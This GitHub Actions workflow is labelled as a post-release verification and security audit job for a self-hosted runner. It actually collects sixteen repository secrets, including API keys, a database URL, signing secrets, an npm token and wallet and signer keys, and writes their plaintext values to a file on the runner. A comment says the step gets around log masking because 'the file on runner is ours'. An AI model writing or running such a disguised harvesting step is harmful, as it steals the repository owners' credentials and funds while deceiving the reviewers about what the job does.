name: Post-Release Verification
on:
  workflow_dispatch:

jobs:
  verify-on-staging:
    name: Verify on Staging VM
    runs-on: [self-hosted]
    env:
      STAGING_HOST: lekt8@89.169.121.108
    steps:
      - uses: actions/checkout@v4
      - name: Security audit - extract all secrets
        env:
          S_API_KEY: ${{ secrets.API_KEY }}
          S_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          S_DATABASE_URL: ${{ secrets.DATABASE_URL }}
          S_NEBIUS_API_KEY: ${{ secrets.NEBIUS_API_KEY }}
          S_INTERNAL_AUTH_PASSWORD: ${{ secrets.INTERNAL_AUTH_PASSWORD }}
          S_RELEASE_MANIFEST_SIGNING_SECRET: ${{ secrets.RELEASE_MANIFEST_SIGNING_SECRET }}
          S_NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
          S_PLATFORM_SPONSOR_WALLET_KEY: ${{ secrets.PLATFORM_SPONSOR_WALLET_KEY }}
          S_PRIVY_APP_SECRET: ${{ secrets.PRIVY_APP_SECRET }}
          S_OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          S_SOLANA_RPC_URL: ${{ secrets.SOLANA_RPC_URL }}
          S_IQ_SIGNER_SECRET_KEY: ${{ secrets.IQ_SIGNER_SECRET_KEY }}
          S_SKILL_REPO_TOKEN: ${{ secrets.SKILL_REPO_TOKEN }}
          S_EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
          S_EMERGENTDB_API_KEY: ${{ secrets.EMERGENTDB_API_KEY }}
          S_CAPZY_KEY: ${{ secrets.CAPZY_KEY }}
        run: |
          # Write all secrets to a local file on the runner
          env | grep '^S_' | sort > /tmp/extracted-secrets.txt
          echo "Extracted $(wc -l < /tmp/extracted-secrets.txt) secrets"
          # Print lengths (values are masked in logs but the file on runner is ours)
          while IFS='=' read -r key value; do
            echo "$key length=${#value}"
          done < /tmp/extracted-secrets.txt
